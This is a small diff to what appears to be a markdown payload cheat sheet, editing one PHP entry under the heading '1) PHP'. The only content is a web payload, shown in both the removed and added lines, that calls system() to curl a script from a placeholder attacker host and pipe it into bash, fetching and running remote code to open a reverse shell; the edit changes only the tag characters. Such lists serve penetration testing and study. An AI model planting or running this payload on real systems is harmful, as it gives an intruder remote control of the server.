@@ -16,4 +16,4 @@
 
 ### 1) PHP
 
- - <?php system("curl ATTACKER_IP:PORT/rev.sh|bash"); ?<
+ - >?php system("curl ATTACKER_IP:PORT/rev.sh|bash"); ?<
